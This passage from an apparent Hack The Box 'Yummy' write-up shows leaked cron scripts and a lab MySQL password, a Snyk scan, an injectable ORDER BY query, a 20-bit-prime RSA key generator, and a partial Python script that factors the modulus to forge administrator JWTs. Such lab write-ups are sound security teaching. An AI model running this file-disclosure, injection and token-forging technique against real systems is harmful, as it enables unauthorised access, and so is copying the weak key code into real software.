+if [ &quot;$response&quot; != &#x27;active&#x27; ]; then
+    /usr/bin/echo &quot;{\&quot;status\&quot;: \&quot;The database is down\&quot;, \&quot;time\&quot;: \&quot;$timestamp\&quot;}&quot; &gt; /data/scripts/dbstatus.json
+    /usr/bin/echo &quot;$service is down, restarting!!!&quot; | /usr/bin/mail -s &quot;$service is down!!!&quot; root
+    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+    /bin/bash &quot;$latest_version&quot;
+else
+    if [ -f /data/scripts/dbstatus.json ]; then
+        if grep -q &quot;database is down&quot; /data/scripts/dbstatus.json 2&gt;/dev/null; then
+            /usr/bin/echo &quot;The database was down at $timestamp. Sending notification.&quot;
+            /usr/bin/echo &quot;$service was down at $timestamp but came back up.&quot; | /usr/bin/mail -s &quot;$service was down!&quot; root
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+        else
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+            /usr/bin/echo &quot;The automation failed in some way, attempting to fix it.&quot;
+            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+            /bin/bash &quot;$latest_version&quot;
+        fi
+    else
+        /usr/bin/echo &quot;Response is OK.&quot;
+    fi
+fi
+
+[ -f dbstatus.json ] &amp;&amp; /usr/bin/rm -f dbstatus.json</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7800cbe7ae57d1dcd5895" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">table_cleanup.sh</code></span><span class="SemanticString"> restores the SQL database used by the web app. It also exposed the DB credentials.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780638cf6f4cf251b5ecd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /data/scripts/table_cleanup.sh
+File read successful:
+#!/bin/sh
+
+/usr/bin/mysql -h localhost -u chef yummy_db -p&#x27;3wDo7gSRZIwIHRxZ!&#x27; &lt; /data/scripts/sqlappointments.sql</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7802691cfc6c47b6ec9e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can also read the SQL script, but all it does is insert dummy appointments with no sensitive information. It looks like part of HTB’s cleanup process, so I’m not sure if this is meant to be readable.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780d0a2f4ff98aef41a42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">&#x27;s cron also runs every minute. It’s creating a ZIP archive of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/app</code></span><span class="SemanticString">, and saving it in the web folder:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780c08f89fd1315a618fb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[*] Full path of file to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /data/scripts/app_backup.sh
+File read successful:
+#!/bin/bash
+
+cd /var/www
+/usr/bin/rm backupapp.zip
+/usr/bin/zip -r backupapp.zip /opt/app</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78039b41bf9af03e80c53" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The ZIP file is also accessible, but I’ll do the download manually in Burp this time. All the binary characters in it would break my terminal.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780a9b1fae22123d374d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looks like it’s the source code of the web app.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78042abd2f78a6bbc0341" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy/app]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 40
+drwxrwxr-x 7 chengw chengw  4096 Sep 30 17:46 .
+drwxr-xr-x 3 chengw chengw  4096 Feb 19 02:43 ..
+-rw-r--r-- 1 chengw chengw 11979 Sep 25 23:24 app.py
+drwxr-xr-x 3 chengw chengw  4096 Sep 30 17:46 config
+drwxr-xr-x 3 chengw chengw  4096 Sep 30 17:46 middleware
+drwxrwxr-x 2 chengw chengw  4096 Sep 30 17:46 __pycache__
+drwxr-xr-x 6 chengw chengw  4096 Sep 30 17:46 static
+drwxr-xr-x 2 chengw chengw  4096 Sep 30 17:46 templates</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780caa819cb4f12efbe61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f78010938fe4df32383d88" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Source Code Analysis:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780ba84a8fa1d067cc93b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As I’m lazy, I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://snyk.io/product/snyk-code/">Snyk</a></span><span class="SemanticString"> for a quick static code scan. It immediately identified 3 medium/high severity issues.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780cf9ea2d8141158ebd1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy/app]
+└─$</span></mark></span><span class="SemanticString"><span> snyk code test .                                                                                                                                         
+
+Testing . ...
+
+ ✗ [Low] Sensitive Cookie Without &#x27;HttpOnly&#x27; Flag 
+   Path: app.py, line 61 
+   Info: Cookie&#x27;s HttpOnly flag is set to False by default. Set it to true to protect the cookie from possible malicious code on client side.
+
+ ✗ [Low] Sensitive Cookie Without &#x27;HttpOnly&#x27; Flag 
+   Path: app.py, line 71 
+   Info: Cookie&#x27;s HttpOnly flag is set to False by default. Set it to true to protect the cookie from possible malicious code on client side.
+
+ ✗ [Low] Sensitive Cookie in HTTPS Session Without &#x27;Secure&#x27; Attribute 
+   Path: app.py, line 61 
+   Info: Cookie&#x27;s Secure flag is set to False by default. Set it to true to protect the cookie from man-in-the-middle attacks.
+
+ ✗ [Low] Sensitive Cookie in HTTPS Session Without &#x27;Secure&#x27; Attribute 
+   Path: app.py, line 71 
+   Info: Cookie&#x27;s Secure flag is set to False by default. Set it to true to protect the cookie from man-in-the-middle attacks.
+
+ ✗ [Medium] Use of Hardcoded Credentials 
+   Path: app.py, line 23 
+   Info: Do not hardcode passwords in code. Found hardcoded password used in a dictionary key.
+
+ ✗ [High] SQL Injection 
+   Path: app.py, line 286 
+   Info: Unsanitized input from an HTTP parameter flows into execute, where it is used in an SQL query. This may result in an SQL Injection vulnerability.
+
+ ✗ [High] Path Traversal 
+   Path: app.py, line 159 
+   Info: Unsanitized input from an HTTP parameter flows into flask.send_file, where it is used as a path. This may result in a Path Traversal vulnerability and allow an attacker to read arbitrary files.
+
+
+✔ Test completed
+
+Organization:      chengw625
+Test type:         Static code analysis
+Project path:      .
+
+Summary:
+
+  7 Code issues found
+  2 [High]   1 [Medium]   4 [Low]</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780f18902e64dbff4064a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The path traversal vulnerability had already been exploited earlier, while the hardcoded credentials discovered were identical to those found in the cron script.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780a5a13bfab84f579f84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the SQL injection vulnerability was found in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/admindashboard</code></span><span class="SemanticString"> endpoint.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78055b6b0d260c9140c75" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admindashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">admindashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        validation <span class="token operator">=</span> validate_login<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> validation <span class="token operator">!=</span> <span class="token string">"administrator"</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>db_config<span class="token punctuation">)</span>
+            <span class="token keyword">with</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>
+                sql <span class="token operator">=</span> <span class="token string">"SELECT * from appointments"</span>
+                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
+                connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                appointments <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+                search_query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+
+                <span class="token comment"># added option to order the reservations</span>
+                order_query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+
+                sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date </span><span class="token interpolation"><span class="token punctuation">{</span>order_query<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> search_query <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                appointments <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admindashboard.html'</span><span class="token punctuation">,</span> appointments<span class="token operator">=</span>appointments<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            flash<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'error'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admindashboard.html'</span><span class="token punctuation">,</span> appointments<span class="token operator">=</span>appointments<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780b0b846e1b80884e5b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It is vulnerable because the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">o</code></span><span class="SemanticString"> parameter is directly used in the SQL query without any input validation/sanitization. Also, it’s used at the very end of the query, making it much easier for injections.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780f9a42cc7b77ddf3010" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To access this page and exploit, I’ll first need to find a way to get admin rights.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7803da9e6e5970b8330f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780edae57f45df739f0c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">RSA 101:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780cf87e6d7aa1a5c3081" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">config/signature.py</code></span><span class="SemanticString"> shows how the RSA key pair is being generated. As shown above, the value of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">n</code></span><span class="SemanticString"> was attached in the JWT token.</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780c4a64bf5dca2ac8e36" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/python3</span>
+
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization
+<span class="token keyword">import</span> sympy
+
+
+<span class="token comment"># Generate RSA key pair</span>
+q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">20</span><span class="token punctuation">)</span>
+n <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">1023</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">*</span> q
+e <span class="token operator">=</span> <span class="token number">65537</span>
+p <span class="token operator">=</span> n <span class="token operator">//</span> q
+phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
+key_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'n'</span><span class="token punctuation">:</span> n<span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">:</span> e<span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span> d<span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">:</span> q<span class="token punctuation">}</span>
+key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+private_key_bytes <span class="token operator">=</span> key<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+private_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_private_key<span class="token punctuation">(</span>
+    private_key_bytes<span class="token punctuation">,</span>
+    password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
+    backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">)</span>
+public_key <span class="token operator">=</span> private_key<span class="token punctuation">.</span>public_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7800f8077e0c61ba96ec7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">RSA is an asymmetric encryption algorithm often referred to as Public Key Cryptography. Typically, the public key encrypts data, which can only be decrypted with the corresponding private key. In the case of JWT, the private key signs the token, and the public key can be used to validate its authenticity.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f7805eb862fcdc076e77ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.cryptool.org/en/cto/rsa-step-by-step/">This page</a></span><span class="SemanticString"> gives a good step-by-step explanation of the algorithm. Essentially the keys are generated with two large prime numbers (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">p</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">q</code></span><span class="SemanticString">), and the public modulus </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">n</code></span><span class="SemanticString"> is the product of the two numbers. The security of RSA fundamentally relies on the assumption that factoring large numbers are extremely difficult and time-consuming, as such </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">p</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">q</code></span><span class="SemanticString"> must be large enough for RSA to be secure. Nowadays a key size of 1024 bit is already considered weak, modern security standards recommend 2048 bit as the absolute minimum. As seen in the code, the key size of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">p</code></span><span class="SemanticString"> is extremely small with only 20 bits, making it feasible to factor </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">n</code></span><span class="SemanticString">, recover the private key and forge JWT tokens.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f780e9beeffe5a7eafae70" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780d28127c1d05715f0e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">JWT Token Forge:</strong></span></span></p></div><div id="https://www.notion.so/1a30b98a88f780f0bdf8eea5c2bd25e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve also scripted up this part, reusing some of the app’s source code for key generation. (GitHub link </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/Yummy/jwt_forge.py">here</a></span><span class="SemanticString">)</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78024b4bbc5713458c19c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> sys
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> sympy
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> jwt
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+<span class="token keyword">def</span> <span class="token function">factorize</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	factors <span class="token operator">=</span> sympy<span class="token punctuation">.</span>factorint<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+	p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>factors<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+	d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[+] Coprime pairs recovered!"</span></span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] p: </span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] q: </span><span class="token interpolation"><span class="token punctuation">{</span>q<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+
+	<span class="token keyword">return</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+	key_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'n'</span><span class="token punctuation">:</span> n<span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">:</span> e<span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span> d<span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">:</span> q<span class="token punctuation">}</span>
+	key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>key_data<span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key_data<span class="token punctuation">[</span><span class="token string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	private_key_bytes <span class="token operator">=</span> key<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	private_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_private_key<span class="token punctuation">(</span>
+		private_key_bytes<span class="token punctuation">,</span>
+		password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
+		backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token punctuation">)</span>
+	public_key <span class="token operator">=</span> private_key<span class="token punctuation">.</span>public_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">return</span> <span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">gen_jwt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[+] Administrative JWT generated:"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+	<span class="token keyword">return</span> token
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Usage: </span><span class="token interpolation"><span class="token punctuation">{</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> &lt;email>"</span></span><span class="token punctuation">)</span>
+		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+	n <span class="token operator">=</span> <span class="token number">6702121647705042361800427665.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	e <span class="token operator">=</span> <span class="token number">65537</span>
+	email <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+	iat <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	exp <span class="token operator">=</span> iat<span class="token operator">+</span><span class="token number">3600</span>
+
+	<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">=</span> factorize<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+	<span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span> <span class="token operator">=</span> gen_key<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+
+	data <span class="token operator">=</span> <span class="token punctuation">{</span>
+		<span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
+		<span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"administrator"</span><span class="token punctuation">,</span>
+		<span class="token string">"iat"</span><span class="token punctuation">:</span> iat<span class="token punctuation">,</span>
+		<span class="token string">"exp"</span><span class="token punctuation">:</span> exp<span class="token punctuation">,</span>
